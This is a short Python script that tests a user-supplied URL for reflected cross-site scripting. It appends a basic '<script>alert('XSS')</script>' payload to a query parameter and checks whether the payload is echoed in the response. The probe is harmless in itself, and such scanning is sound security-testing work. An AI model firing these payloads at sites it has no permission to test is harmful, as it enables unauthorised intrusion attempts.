import requests

def test_xss(url):
    payload = "<script>alert('XSS')</script>"
    test_url = f"{url}{payload}"

    try:
        print(f"[+] Testing: {test_url}")
        res = requests.get(test_url, timeout=5)
        
        if payload in res.text:
            print("[!] Possible XSS vulnerability found!")
        else:
            print("[-] No XSS detected.")
    except requests.exceptions.RequestException as e:
        print("[!] Request failed:", e)

if __name__ == "__main__":
    target = input("Enter URL with parameter (e.g., https://site.com/page?q=): ").strip()
    if "=" not in target:
        print("Invalid URL format. Must include '=' for parameter injection.")
    else:
        test_xss(target)
